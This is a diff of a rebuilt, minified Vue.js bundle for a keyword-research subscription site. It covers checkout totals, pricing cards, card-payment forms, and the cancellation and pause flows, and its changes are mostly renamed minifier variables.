             }, [S("div", Mn, [S("div", null, v(e.trans.get("Total After Trial")), 1), S("div", null, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)), 1)]), S("div", An, [S("div", null, v(e.trans.get("Due Today")), 1), S("div", null, v(e.$filters.digit(0, o.currency_symbol)), 1)])], 64)) : (b(), g(y, {
                 key: 1
-            }, [r.skip_trial ? (b(), g("div", Pn, [S("div", null, [S("p", Ln, v(e.trans.get("Due Today")), 1)]), S("div", null, [S("p", Bn, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)), 1)])])) : r.existing_plan_amount > 0 ? (b(), g("div", $n, [S("div", null, [S("p", Dn, v(e.trans.get("New Billing Amount")), 1)]), S("div", null, [S("p", On, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)) + " / " + v(a.period_yearly ? e.trans.get("year") : e.trans.get("month")), 1)])])) : (b(), g("div", jn, [S("div", null, [S("p", Vn, v(e.trans.get("Due Now")), 1)]), S("div", null, [S("p", Hn, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)), 1)])]))], 64))]), 3 == a.step ? (b(), g("div", In, [r.allow_free_trial ? (b(), g("small", Nn, [S("span", {
+            }, [r.skip_trial ? (b(), g("div", Pn, [S("div", null, [S("p", $n, v(e.trans.get("Due Today")), 1)]), S("div", null, [S("p", Ln, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)), 1)])])) : r.existing_plan_amount > 0 ? (b(), g("div", Dn, [S("div", null, [S("p", jn, v(e.trans.get("New Billing Amount")), 1)]), S("div", null, [S("p", On, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)) + " / " + v(a.period_yearly ? e.trans.get("year") : e.trans.get("month")), 1)])])) : (b(), g("div", Wn, [S("div", null, [S("p", Vn, v(e.trans.get("Due Now")), 1)]), S("div", null, [S("p", Hn, v(e.$filters.digit(o.grand_total_amount, o.currency_symbol)), 1)])]))], 64))]), 3 == a.step ? (b(), g("div", In, [r.allow_free_trial ? (b(), g("small", Nn, [S("span", {
                 innerHTML: e.trans.get("You will be charged <strong>:due_amount</strong> after your free trial ends on :trial_end_date. See our", {
                     due_amount: e.$filters.digit(o.due_amount, a.currency + o.currency_symbol),
                     trial_end_date: o.trial_end_date.toLocaleDateString("en-US")
                 })
-            }, null, 8, Rn), P(), S("span", {
+            }, null, 8, Bn), P(), S("span", {
                 class: "text-primary fw-bold cursor-pointer",
                 "data-bs-content": e.trans.get("Your subscription can be canceled at any time inside your Keyword Tool account. You can request a full refund within :day days after making the first payment.", {
                     day: a.refundable_day
@@ -3563,10 +3563,10 @@ const zn = Ue(Ja, [
                 "data-bs-trigger": "hover focus"
             }, v(e.trans.get(":day Days money back guarantee", {
                 day: a.refundable_day
-            })), 9, Kn), P(".")])) : o.is_change_period || o.is_upgrade || o.is_addon || r.is_trial_user && !r.skip_trial ? (b(), g("small", Jn)) : (b(), g("small", {
+            })), 9, Rn), P(".")])) : o.is_change_period || o.is_upgrade || o.is_addon || r.is_trial_user && !r.skip_trial ? (b(), g("small", Kn)) : (b(), g("small", {
                 key: 2,
                 innerHTML: e.trans.get("Your subscription will start immediately. All the following payments will be automatically deducted using your preferred payment method. You can cancel your subscription at any time.")
-            }, null, 8, Wn))])) : T("", !0)])])])) : T("", !0)], 64)) : T("", !0)])])])])
+            }, null, 8, Jn))])) : T("", !0)])])])) : T("", !0)], 64)) : T("", !0)])])])])
         }]
     ]),
     Yn = {
@@ -3804,16 +3804,16 @@ const zn = Ue(Ja, [
     },
     Al = ["disabled"],
     Pl = ["disabled"],
-    Ll = {
+    $l = {
         class: "d-flex justify-content-between align-items-center"
     },
-    Bl = {
+    Ll = {
         class: "text-muted"
     },
-    $l = S("i", {
+    Dl = S("i", {
         class: "bi bi-lock me-1"
     }, null, -1);
-const Dl = Ue(Yn, [
+const jl = Ue(Yn, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("loading-section"),
                 n = k("stripe-payment"),
@@ -3977,7 +3977,7 @@ const Dl = Ue(Yn, [
                 onClick: t[15] || (t[15] = e => o.submit()),
                 type: "button",
                 class: "btn btn-block btn btn-primary add-card-button"
-            }, v(e.trans.get("Add Now")), 9, Pl))])])])]), S("div", Ll, [S("small", Bl, [$l, P(" " + v(e.trans.get("We use Stripe to handle payments and card information securely. Stripe is a Validated Level 1 PCI DSS Compliant Service Provider. All pages on our website are secured with modern SSL/TLS encryption.")), 1)])])], 32)])])])])])
+            }, v(e.trans.get("Add Now")), 9, Pl))])])])]), S("div", $l, [S("small", Ll, [Dl, P(" " + v(e.trans.get("We use Stripe to handle payments and card information securely. Stripe is a Validated Level 1 PCI DSS Compliant Service Provider. All pages on our website are secured with modern SSL/TLS encryption.")), 1)])])], 32)])])])])])
         }]
     ]),
     Ol = {
@@ -4057,7 +4057,7 @@ const Dl = Ue(Yn, [
             }
         }
     },
-    jl = {
+    Wl = {
         class: "mb-3 row row-eq-height"
     },
     Vl = {
@@ -4073,15 +4073,15 @@ const Dl = Ue(Yn, [
     Nl = {
         class: "card-body"
     },
-    Rl = S("h4", null, "Pro Basic", -1),
-    Kl = {
+    Bl = S("h4", null, "Pro Basic", -1),
+    Rl = {
         class: "card-title pricing-card-title fw-bolder"
     },
-    Jl = {
+    Kl = {
         key: 0,
         class: "mt-n1 text-muted"
     },
-    Wl = {
+    Jl = {
         key: 1,
         href: "#",
         class: "btn btn-lg btn-block btn-primary disabled"
@@ -4221,17 +4221,12 @@ const Dl = Ue(Yn, [
     }, [S("i", {
         class: "bi bi-check-lg text-success me-1"
     })], -1),
-    Lc = S("td", {
-        class: "align-text-top"
-    }, [S("i", {
-        class: "bi bi-check-lg text-success me-1"
-    })], -1),
-    Bc = S("td", {
-        class: "align-text-top"
-    }, [S("i", {
-        class: "bi bi-check-lg text-success me-1"
-    })], -1),
     $c = S("td", {
+        class: "align-text-top"
+    }, [S("i", {
+        class: "bi bi-check-lg text-success me-1"
+    })], -1),
+    Lc = S("td", {
         class: "align-text-top"
     }, [S("i", {
         class: "bi bi-check-lg text-success me-1"
@@ -4241,12 +4236,17 @@ const Dl = Ue(Yn, [
     }, [S("i", {
         class: "bi bi-check-lg text-success me-1"
     })], -1),
+    jc = S("td", {
+        class: "align-text-top"
+    }, [S("i", {
+        class: "bi bi-check-lg text-success me-1"
+    })], -1),
     Oc = S("td", {
         class: "align-text-top"
     }, [S("i", {
         class: "bi bi-check-lg text-success me-1"
     })], -1),
-    jc = {
+    Wc = {
         class: "card h-100"
     },
     Vc = {
@@ -4259,17 +4259,17 @@ const Dl = Ue(Yn, [
     Nc = {
         class: "card-title pricing-card-title fw-bolder"
     },
-    Rc = {
+    Bc = {
         key: 0,
         class: "mt-n1 text-muted"
     },
-    Kc = {
+    Rc = {
         key: 1,
         href: "#",
         class: "btn btn-lg btn-block btn-primary disabled"
     },
-    Jc = ["href"],
-    Wc = {
+    Kc = ["href"],
+    Jc = {
         key: 3,
         href: "#",
         class: "btn btn-lg btn-block btn-primary disabled"
@@ -4387,22 +4387,22 @@ const Dl = Ue(Yn, [
         key: 0,
         class: "content-custom-quote my-4"
     },
-    L_ = {
+    $_ = {
         class: "content-body"
     },
-    B_ = {
+    L_ = {
         class: "row"
     },
-    $_ = S("div", {
+    D_ = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1),
-    D_ = {
+    j_ = {
         class: "col-sm-12 col-md-12 col-lg-10"
     },
     O_ = {
         class: "card text-center"
     },
-    j_ = {
+    W_ = {
         class: "card-body"
     },
     V_ = {
@@ -4417,18 +4417,18 @@ const Dl = Ue(Yn, [
     N_ = {
         class: "card-text"
     },
-    R_ = {
+    B_ = {
         class: "col-12 text-center"
     },
-    K_ = ["href"],
-    J_ = S("div", {
+    R_ = ["href"],
+    K_ = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1);
-const W_ = Ue(Ol, [
+const J_ = Ue(Ol, [
         ["render", function(e, t, r, s, a, o) {
             return b(), g("div", {
                 class: f(["signup-table", ["signup-table-" + r.period, "signup-table-" + r.type]])
-            }, [S("div", jl, ["pro" == r.type ? (b(), g(y, {
+            }, [S("div", Wl, ["pro" == r.type ? (b(), g(y, {
                 key: 0
             }, [!r.plan || r.allow_subscribe || !r.allow_subscribe && "probasic" == o.plan_code ? (b(), g("div", {
                 key: 0,
@@ -4437,7 +4437,7 @@ const W_ = Ue(Ol, [
                 }, "probasic col-12 order-2 order-md-1 mb-3"])
             }, [S("div", Vl, [r.allow_subscribe ? (b(), g("div", Hl, Il)) : T("", !0), S("div", Nl, [r.allow_subscribe ? (b(), g(y, {
                 key: 0
-            }, [Rl, S("h3", Kl, v(o.price_term("pro_basic_v2")), 1), "yearly" == r.period ? (b(), g("p", Jl, v(e.trans.get("billed every 12 months")), 1)) : T("", !0), "probasic" == o.plan_code ? (b(), g("a", Wl, v(e.trans.get("Current Plan")), 1)) : r.is_trial_user ? (b(), g("a", {
+            }, [Bl, S("h3", Rl, v(o.price_term("pro_basic_v2")), 1), "yearly" == r.period ? (b(), g("p", Kl, v(e.trans.get("billed every 12 months")), 1)) : T("", !0), "probasic" == o.plan_code ? (b(), g("a", Jl, v(e.trans.get("Current Plan")), 1)) : r.is_trial_user ? (b(), g("a", {
                 key: 2,
                 href: o.checkout("pro_basic_v2"),
                 class: "btn btn-lg btn-block btn-primary"
@@ -4571,19 +4571,19 @@ const W_ = Ue(Ol, [
                 class: f({
                     "col-sm-6": !r.allow_subscribe
                 })
-            }, [S("table", null, [S("tr", null, [Lc, S("td", null, v(e.trans.get("Competition Data")), 1)])])], 2), S("li", {
+            }, [S("table", null, [S("tr", null, [$c, S("td", null, v(e.trans.get("Competition Data")), 1)])])], 2), S("li", {
                 class: f({
                     "col-sm-6": !r.allow_subscribe
                 })
-            }, [S("table", null, [S("tr", null, [Bc, S("td", null, v(e.trans.get("More Keywords")), 1)])])], 2), S("li", {
+            }, [S("table", null, [S("tr", null, [Lc, S("td", null, v(e.trans.get("More Keywords")), 1)])])], 2), S("li", {
                 class: f({
                     "col-sm-6": !r.allow_subscribe
                 })
-            }, [S("table", null, [S("tr", null, [$c, S("td", null, v(e.trans.get("Bulk Search Volume Analysis")), 1)])])], 2), S("li", {
+            }, [S("table", null, [S("tr", null, [Dc, S("td", null, v(e.trans.get("Bulk Search Volume Analysis")), 1)])])], 2), S("li", {
                 class: f({
                     "col-sm-6": !r.allow_subscribe
                 })
-            }, [S("table", null, [S("tr", null, [Dc, S("td", null, v(e.trans.get(":count API Requests Per Day", {
+            }, [S("table", null, [S("tr", null, [jc, S("td", null, v(e.trans.get(":count API Requests Per Day", {
                 count: e.$filters.digit(50)
             })), 1)])])], 2), S("li", {
                 class: f({
@@ -4598,7 +4598,7 @@ const W_ = Ue(Ol, [
                 class: f([{
                     "col-md-4": r.allow_subscribe
                 }, "apilite col-12 order-1 order-md-1 mb-3"])
-            }, [S("div", jc, [r.allow_subscribe ? (b(), g("div", {
+            }, [S("div", Wc, [r.allow_subscribe ? (b(), g("div", {
                 key: 0,
                 class: f(["card-header p-1 text-center", {
                     "bg-primary border-primary text-white": r.allow_subscribe,
@@ -4608,11 +4608,11 @@ const W_ = Ue(Ol, [
                 key: 0
             }, [P(v(e.trans.get("Most Popular Plan")), 1)], 64)) : T("", !0)])], 2)) : T("", !0), S("div", Hc, [r.allow_subscribe ? (b(), g(y, {
                 key: 0
-            }, [Ic, S("h3", Nc, v(o.price_term("api_v2_lite_v2")), 1), "yearly" == r.period ? (b(), g("p", Rc, v(e.trans.get("billed every 12 months")), 1)) : T("", !0), "apilite" == o.plan_code ? (b(), g("a", Kc, v(e.trans.get("Current Plan")), 1)) : r.is_trial_user ? (b(), g("a", {
+            }, [Ic, S("h3", Nc, v(o.price_term("api_v2_lite_v2")), 1), "yearly" == r.period ? (b(), g("p", Bc, v(e.trans.get("billed every 12 months")), 1)) : T("", !0), "apilite" == o.plan_code ? (b(), g("a", Rc, v(e.trans.get("Current Plan")), 1)) : r.is_trial_user ? (b(), g("a", {
                 key: 2,
                 href: o.checkout("api_v2_lite_v2"),
                 class: "btn btn-lg btn-block btn-primary"
-            }, v(e.trans.get("Change Plan")), 9, Jc)) : "apibasic" == o.plan_code || "apiplus" == o.plan_code ? (b(), g("a", Wc, v(e.trans.get("Not Available")), 1)) : (b(), g("a", {
+            }, v(e.trans.get("Change Plan")), 9, Kc)) : "apibasic" == o.plan_code || "apiplus" == o.plan_code ? (b(), g("a", Jc, v(e.trans.get("Not Available")), 1)) : (b(), g("a", {
                 key: 4,
                 href: o.checkout("api_v2_lite_v2"),
                 class: "btn btn-lg btn-block btn-primary"
@@ -4726,12 +4726,12 @@ const W_ = Ue(Ol, [
                 innerHTML: e.trans.get("Get Data for <strong>:count keywords</strong> every 24 hours", {
                     count: e.$filters.digit(8e5)
                 })
-            }, null, 8, A_)])])])], 2)], 2)])])], 2)) : T("", !0)], 64)) : T("", !0)]), r.allow_subscribe ? (b(), g("div", P_, [S("div", L_, [S("div", B_, [$_, S("div", D_, [S("div", O_, [S("div", j_, [S("h5", V_, v(e.trans.get("Can Not Find A Match? Get Custom Quote")), 1), S("div", H_, [S("div", I_, [S("p", N_, v(e.trans.get("Contact our team, and we will tailor a special :plan plan to serve your unique requirements.", {
+            }, null, 8, A_)])])])], 2)], 2)])])], 2)) : T("", !0)], 64)) : T("", !0)]), r.allow_subscribe ? (b(), g("div", P_, [S("div", $_, [S("div", L_, [D_, S("div", j_, [S("div", O_, [S("div", W_, [S("h5", V_, v(e.trans.get("Can Not Find A Match? Get Custom Quote")), 1), S("div", H_, [S("div", I_, [S("p", N_, v(e.trans.get("Contact our team, and we will tailor a special :plan plan to serve your unique requirements.", {
                 plan: "api" == r.type ? "Keyword Tool API" : "Keyword Tool Pro"
-            })), 1)]), S("div", R_, [S("a", {
+            })), 1)]), S("div", B_, [S("a", {
                 href: o.checkout("custom"),
                 class: "btn btn-primary mt-3"
-            }, v(e.trans.get("Contact Us")), 9, K_)])])])])]), J_])])])) : T("", !0)], 2)
+            }, v(e.trans.get("Contact Us")), 9, R_)])])])])]), K_])])])) : T("", !0)], 2)
         }]
     ]),
     z_ = {
@@ -5085,22 +5085,22 @@ const ou = Ue(z_, [
         key: 0,
         class: "invalid-feedback"
     },
-    Lu = {
+    $u = {
         class: "row"
     },
-    Bu = {
+    Lu = {
         class: "col"
     },
-    $u = {
+    Du = {
         class: "mb-3"
     },
-    Du = S("span", {
+    ju = S("span", {
         class: "text-danger"
     }, "*", -1),
     Ou = {
         class: "form-check"
     },
-    ju = {
+    Wu = {
         for: "reason-1",
         class: "form-check-label"
     },
@@ -5118,17 +5118,17 @@ const ou = Ue(z_, [
         for: "reason-3",
         class: "form-check-label"
     },
-    Ru = {
+    Bu = {
         class: "form-check"
     },
-    Ku = {
+    Ru = {
         for: "reason-4",
         class: "form-check-label"
     },
-    Ju = {
+    Ku = {
         class: "form-check"
     },
-    Wu = {
+    Ju = {
         for: "reason-5",
         class: "form-check-label"
     },
@@ -5251,20 +5251,20 @@ const ou = Ue(z_, [
     Pd = S("span", {
         class: "text-danger"
     }, "*", -1),
-    Ld = ["placeholder"],
-    Bd = {
+    $d = ["placeholder"],
+    Ld = {
         key: 0,
         class: "invalid-feedback"
     },
-    $d = {
+    Dd = {
         key: 1,
         class: "invalid-feedback"
     },
-    Dd = {
+    jd = {
         class: "mb-3 my-4 text-center"
     },
     Od = ["disabled"],
-    jd = ["disabled"],
+    Wd = ["disabled"],
     Vd = ["disabled"];
 const Hd = Ue(iu, [
         ["render", function(e, t, r, s, a, o) {
@@ -5291,7 +5291,7 @@ const Hd = Ue(iu, [
             }, null, 8, fu)]), S("li", null, [bu, S("span", {
                 innerHTML: e.trans.get("<b>ALL</b> invited account users will be <b>removed</b>")
             }, null, 8, vu)])]), S("p", ku, v(e.trans.get("This action is irreversible. Do you wish to proceed?")), 1)])], 512), [
-                [B, 1 == a.step]
+                [L, 1 == a.step]
             ]), F(S("div", xu, [S("p", null, v(e.trans.get("We are sorry to see you go. To help us improve, could you please let us know why you are cancelling your Keyword Tool subscription? Your feedback will help us make Keyword Tool better for you and others.")), 1), F(S("div", Cu, [S("div", Su, [S("div", Tu, [S("label", Fu, [P(v(e.trans.get("Which Subscription Would You Like To Cancel?")) + " ", 1), qu]), F(S("div", {
                 class: f(["form-check", {
                     "is-invalid": a.subscriptions.length <= 0
@@ -5306,7 +5306,7 @@ const Hd = Ue(iu, [
             }, null, 8, Eu), [
                 [q, a.subscriptions]
             ]), S("label", Uu, v(r.pro_role_name), 1)], 2), [
-                [B, r.show_pro_checkbox]
+                [L, r.show_pro_checkbox]
             ]), F(S("div", {
                 class: f(["form-check", {
                     "is-invalid": a.subscriptions.length <= 0
@@ -5321,14 +5321,14 @@ const Hd = Ue(iu, [
             }, null, 8, Mu), [
                 [q, a.subscriptions]
             ]), S("label", Au, v(r.api_role_name), 1)], 2), [
-                [B, r.show_api_checkbox]
+                [L, r.show_api_checkbox]
             ]), a.subscriptions.length <= 0 ? (b(), g("div", Pu, v(e.trans.get("Please select a subscription that you wish to cancel.")), 1)) : T("", !0)])])], 512), [
-                [B, r.show_pro_checkbox || r.show_api_checkbox]
-            ]), S("div", Lu, [S("div", Bu, [S("div", $u, [S("label", {
+                [L, r.show_pro_checkbox || r.show_api_checkbox]
+            ]), S("div", $u, [S("div", Lu, [S("div", Du, [S("label", {
                 class: f(["form-label", {
                     "is-invalid": a.reasons.length <= 0
                 }])
-            }, [P(v(e.trans.get("Which of the following best describes your reason(s) for cancelling Keyword Tool subscription? You can select one or more of the options below:")) + " ", 1), Du], 2), S("div", Ou, [F(S("input", {
+            }, [P(v(e.trans.get("Which of the following best describes your reason(s) for cancelling Keyword Tool subscription? You can select one or more of the options below:")) + " ", 1), ju], 2), S("div", Ou, [F(S("input", {
                 id: "reason-1",
                 "onUpdate:modelValue": t[3] || (t[3] = e => a.reasons = e),
                 class: "form-check-input reasons-checkbox",
@@ -5337,7 +5337,7 @@ const Hd = Ue(iu, [
                 type: "checkbox"
             }, null, 512), [
                 [q, a.reasons]
-            ]), S("label", ju, v(e.trans.get("Not enough functionality")), 1)]), S("div", Vu, [F(S("input", {
+            ]), S("label", Wu, v(e.trans.get("Not enough functionality")), 1)]), S("div", Vu, [F(S("input", {
                 id: "reason-2",
                 "onUpdate:modelValue": t[4] || (t[4] = e => a.reasons = e),
                 class: "form-check-input reasons-checkbox",
@@ -5355,7 +5355,7 @@ const Hd = Ue(iu, [
                 type: "checkbox"
             }, null, 512), [
                 [q, a.reasons]
-            ]), S("label", Nu, v(e.trans.get("The price is too high")), 1)]), S("div", Ru, [F(S("input", {
+            ]), S("label", Nu, v(e.trans.get("The price is too high")), 1)]), S("div", Bu, [F(S("input", {
                 id: "reason-4",
                 "onUpdate:modelValue": t[6] || (t[6] = e => a.reasons = e),
                 class: "form-check-input reasons-checkbox",
@@ -5364,7 +5364,7 @@ const Hd = Ue(iu, [
                 type: "checkbox"
             }, null, 512), [
                 [q, a.reasons]
-            ]), S("label", Ku, v(e.trans.get("I have found another alternative")), 1)]), S("div", Ju, [F(S("input", {
+            ]), S("label", Ru, v(e.trans.get("I have found another alternative")), 1)]), S("div", Ku, [F(S("input", {
                 id: "reason-5",
                 "onUpdate:modelValue": t[7] || (t[7] = e => a.reasons = e),
                 class: "form-check-input reasons-checkbox",
@@ -5373,7 +5373,7 @@ const Hd = Ue(iu, [
                 type: "checkbox"
             }, null, 512), [
                 [q, a.reasons]
-            ]), S("label", Wu, v(e.trans.get("The tool was not used often enough")), 1)]), a.validating_reasons && a.reasons.length <= 0 ? (b(), g("div", zu, v(e.trans.get("Please provide answers for the required questions.")), 1)) : T("", !0)])])]), S("div", Yu, [S("div", Gu, [S("div", Xu, [S("label", Qu, [P(v(e.trans.get("If none of the previous options describe your reason for cancelling the subscription, please let us know if there is something else that you can share with us. We value your feedback and would appreciate any information you can provide to help us improve our services.")) + " ", 1), Zu]), F(S("textarea", {
+            ]), S("label", Ju, v(e.trans.get("The tool was not used often enough")), 1)]), a.validating_reasons && a.reasons.length <= 0 ? (b(), g("div", zu, v(e.trans.get("Please provide answers for the required questions.")), 1)) : T("", !0)])])]), S("div", Yu, [S("div", Gu, [S("div", Xu, [S("label", Qu, [P(v(e.trans.get("If none of the previous options describe your reason for cancelling the subscription, please let us know if there is something else that you can share with us. We value your feedback and would appreciate any information you can provide to help us improve our services.")) + " ", 1), Zu]), F(S("textarea", {
                 id: "explanation",
                 "onUpdate:modelValue": t[8] || (t[8] = e => a.explanation = e),
                 name: "explanation",
@@ -5391,7 +5391,7 @@ const Hd = Ue(iu, [
             ]), S("p", td, v(a.explanation.length) + " / " + v(a.explanation_max_char) + " " + v(e.trans.get("characters")), 1), a.explanation.length <= 0 ? (b(), g("div", rd, v(e.trans.get("Additional Reason is required.")), 1)) : T("", !0), a.explanation.length > a.explanation_max_char ? (b(), g("div", sd, v(e.trans.get("Additional Reason cannot exceed :count characters.", {
                 count: a.explanation_max_char
             })), 1)) : T("", !0)])])])], 512), [
-                [B, 2 == a.step]
+                [L, 2 == a.step]
             ]), F(S("div", ad, [S("p", od, v(e.trans.get("We are sorry to see you go. We hope you will consider using Keyword Tool again in the future")), 1), o.skip_delete_account ? (b(), g(y, {
                 key: 0
             }, [S("div", id, [S("div", nd, [E(i, {
@@ -5451,15 +5451,15 @@ const Hd = Ue(iu, [
                     "is-valid": a.validating_confirm_delete && a.confirm_delete == e.trans.get("delete my account")
                 }]),
                 required: ""
-            }, null, 42, Ld), [
+            }, null, 42, $d), [
                 [U, a.confirm_delete, void 0, {
                     trim: !0
                 }]
-            ]), a.password.length <= 0 ? (b(), g("div", Bd, v(e.trans.get("Please enter confirmation sentence.")), 1)) : a.confirm_delete.toLowerCase() != e.trans.get("delete my account") ? (b(), g("div", $d, v(e.trans.get("Confirmation sentence incorrect.")), 1)) : T("", !0)])])])], 512), [
-                [B, a.term1 && a.term2]
+            ]), a.password.length <= 0 ? (b(), g("div", Ld, v(e.trans.get("Please enter confirmation sentence.")), 1)) : a.confirm_delete.toLowerCase() != e.trans.get("delete my account") ? (b(), g("div", Dd, v(e.trans.get("Confirmation sentence incorrect.")), 1)) : T("", !0)])])])], 512), [
+                [L, a.term1 && a.term2]
             ])], 64))], 512), [
-                [B, 3 == a.step]
-            ]), S("div", Dd, ["" != r.pause_url ? (b(), g("button", {
+                [L, 3 == a.step]
+            ]), S("div", jd, ["" != r.pause_url ? (b(), g("button", {
                 key: 0,
                 type: "button",
                 class: "btn btn-primary pause-button my-1 me-2",
@@ -5476,7 +5476,7 @@ const Hd = Ue(iu, [
                 disabled: 0 == o.validate(),
                 class: "btn btn-danger cancel-button my-1",
                 onClick: t[19] || (t[19] = e => o.step2())
-            }, v(e.trans.get("Proceed With Cancellation")), 9, jd)) : 3 == a.step ? (b(), g("button", {
+            }, v(e.trans.get("Proceed With Cancellation")), 9, Wd)) : 3 == a.step ? (b(), g("button", {
                 key: 3,
                 type: "button",
                 disabled: 0 == o.validate(),
@@ -5554,14 +5554,14 @@ const Hd = Ue(iu, [
     Nd = S("i", {
         class: "bi bi-arrow-left me-1"
     }, null, -1),
-    Rd = {
+    Bd = {
         class: "page-title mt-2 mb-4 my-lg-4"
     },
-    Kd = ["action"],
-    Jd = {
+    Rd = ["action"],
+    Kd = {
         class: "mb-3"
     },
-    Wd = {
+    Jd = {
         class: "form-label"
     },
     zd = S("span", {
@@ -5633,14 +5633,14 @@ const ym = Ue(Id, [
             return b(), g(y, null, [S("button", {
                 class: "btn btn-light",
                 onClick: t[0] || (t[0] = (...e) => o.back && o.back(...e))
-            }, [Nd, P(" " + v(e.trans.get("Back")), 1)]), S("h4", Rd, v(e.trans.get("Pause Subscription")), 1), S("p", null, v(e.trans.get("When your subscription is paused, you will not be able to access any features and will not be charged. Your subscription will automatically resume after duration ends.")), 1), S("form", {
+            }, [Nd, P(" " + v(e.trans.get("Back")), 1)]), S("h4", Bd, v(e.trans.get("Pause Subscription")), 1), S("p", null, v(e.trans.get("When your subscription is paused, you will not be able to access any features and will not be charged. Your subscription will automatically resume after duration ends.")), 1), S("form", {
                 enctype: "multipart/form-data",
                 action: r.submit_url,
                 role: "form",
                 method: "post",
                 id: "pause-form",
                 "accept-charset": "UTF-8"
-            }, [S("div", Jd, [S("label", Wd, [P(v(e.trans.get("When Would You Like To Pause?")) + " ", 1), zd]), S("input", {
+            }, [S("div", Kd, [S("label", Jd, [P(v(e.trans.get("When Would You Like To Pause?")) + " ", 1), zd]), S("input", {
                 value: r.subscription_id,
                 type: "hidden",
                 id: "subscription_id",
@@ -5717,7 +5717,7 @@ const ym = Ue(Id, [
                 class: "btn btn-primary pause-button",
                 disabled: 0 == o.validate(),
                 onClick: t[10] || (t[10] = e => o.submit())
-            }, v(e.trans.get("Pause My Subscription")), 9, gm)])], 8, Kd)], 64)
+            }, v(e.trans.get("Pause My Subscription")), 9, gm)])], 8, Rd)], 64)
         }]
     ]),
     wm = {
@@ -6204,27 +6204,27 @@ const ym = Ue(Id, [
         key: 1,
         class: "checkout-form-new-payment-details"
     },
-    Lm = {
+    $m = {
         key: 0,
         class: "alert alert-danger",
         role: "alert"
     },
-    Bm = S("td", {
+    Lm = S("td", {
         class: "w-1 align-top"
     }, [S("i", {
         class: "bi bi-exclamation-circle-fill me-2"
     })], -1),
-    $m = {
+    Dm = {
         class: "checkout-form-card-holder mb-3 position-relative"
     },
-    Dm = {
+    jm = {
         class: "form-label",
         for: "card-holder-name-braintree"
     },
     Om = S("span", {
         class: "text-danger"
     }, "*", -1),
-    jm = {
+    Wm = {
         key: 0,
         class: "invalid-feedback"
     },
@@ -6242,17 +6242,17 @@ const ym = Ue(Id, [
         id: "card-number-braintree",
         class: "checkout-form-card-number-value form-control form-control"
     }, null, -1),
-    Rm = {
+    Bm = {
         key: 0,
         class: "invalid-feedback"
     },
-    Km = {
+    Rm = {
         class: "checkout-form-card-expiration-date row"
     },
-    Jm = {
+    Km = {
         class: "mb-3 col-md-6"
     },
-    Wm = {
+    Jm = {
         class: "form-label",
         for: "card-expiry-braintree"
     },
@@ -6320,7 +6320,7 @@ const ah = Ue(wm, [
                 value: r.billing_card.expired,
                 type: "text",
                 class: "checkout-form-current-card-expiration-date-value form-control form-control"
-            }, null, 8, Am)])])])) : (b(), g("div", Pm, [a.hasError ? (b(), g("div", Lm, [S("table", null, [S("tbody", null, [Bm, S("td", null, v(e.trans.get("Please verify that you have entered the correct payment details.")), 1)])])])) : T("", !0), S("div", $m, [S("label", Dm, [P(v(e.trans.get("Name On Card")) + " ", 1), Om]), F(S("input", {
+            }, null, 8, Am)])])])) : (b(), g("div", Pm, [a.hasError ? (b(), g("div", $m, [S("table", null, [S("tbody", null, [Lm, S("td", null, v(e.trans.get("Please verify that you have entered the correct payment details.")), 1)])])])) : T("", !0), S("div", Dm, [S("label", jm, [P(v(e.trans.get("Name On Card")) + " ", 1), Om]), F(S("input", {
                 maxlength: "24",
                 onKeyup: t[0] || (t[0] = M(A(((...e) => o.checkout && o.checkout(...e)), ["prevent"]), ["enter"])),
                 autocomplete: "cc-name",
@@ -6334,8 +6334,8 @@ const ah = Ue(wm, [
                 [U, a.card_holder_name, void 0, {
                     trim: !0
                 }]
-            ]), a.validating_card_holder_name && 0 == a.valid_card_holder_name ? (b(), g("div", jm, v(e.trans.get("Card holder name is required")), 1)) : T("", !0)]), S("div", Vm, [S("label", Hm, [P(v(e.trans.get("Card Number")) + " " + v("visa_master" == r.payment_method ? "(Visa or Mastercard)" : "(American Express)") + " ", 1), Im]), Nm, 0 == a.valid_card_number ? (b(), g("div", Rm, v(e.trans.get("Sorry, the provided card number appears to be invalid.")), 1)) : T("", !0)]), F(S("div", Km, [S("div", Jm, [S("label", Wm, [P(v(e.trans.get("Expiration")) + " ", 1), zm]), Ym, 0 == a.valid_card_expiry ? (b(), g("div", Gm, v(e.trans.get("Card expiry is invalid.")), 1)) : T("", !0)]), S("div", Xm, [Qm, Zm, 0 == a.valid_card_cvv ? (b(), g("div", eh, v(e.trans.get("Card CVV is invalid.")), 1)) : T("", !0)])], 512), [
-                [B, a.validating_card_number && a.valid_card_number]
+            ]), a.validating_card_holder_name && 0 == a.valid_card_holder_name ? (b(), g("div", Wm, v(e.trans.get("Card holder name is required")), 1)) : T("", !0)]), S("div", Vm, [S("label", Hm, [P(v(e.trans.get("Card Number")) + " " + v("visa_master" == r.payment_method ? "(Visa or Mastercard)" : "(American Express)") + " ", 1), Im]), Nm, 0 == a.valid_card_number ? (b(), g("div", Bm, v(e.trans.get("Sorry, the provided card number appears to be invalid.")), 1)) : T("", !0)]), F(S("div", Rm, [S("div", Km, [S("label", Jm, [P(v(e.trans.get("Expiration")) + " ", 1), zm]), Ym, 0 == a.valid_card_expiry ? (b(), g("div", Gm, v(e.trans.get("Card expiry is invalid.")), 1)) : T("", !0)]), S("div", Xm, [Qm, Zm, 0 == a.valid_card_cvv ? (b(), g("div", eh, v(e.trans.get("Card CVV is invalid.")), 1)) : T("", !0)])], 512), [
+                [L, a.validating_card_number && a.valid_card_number]
             ])])), r.is_subscribe ? (b(), g("div", th, [S("small", rh, [sh, P(" " + v(e.trans.get("We use Braintree to handle payments and card information securely. Braintree is a Validated Level 1 PCI DSS Compliant Service Provider. All pages on our website are secured with modern SSL/TLS encryption.")), 1)])])) : T("", !0)], 32)])
         }]
     ]),
@@ -6998,25 +6998,25 @@ const ah = Ue(wm, [
     Ph = {
         class: "mb-3 col-md-6"
     },
-    Lh = {
+    $h = {
         class: "form-label",
         for: "card-expiry-stripe"
     },
-    Bh = S("span", {
+    Lh = S("span", {
         class: "text-danger"
     }, "*", -1),
-    $h = S("div", {
+    Dh = S("div", {
         id: "card-expiry-stripe",
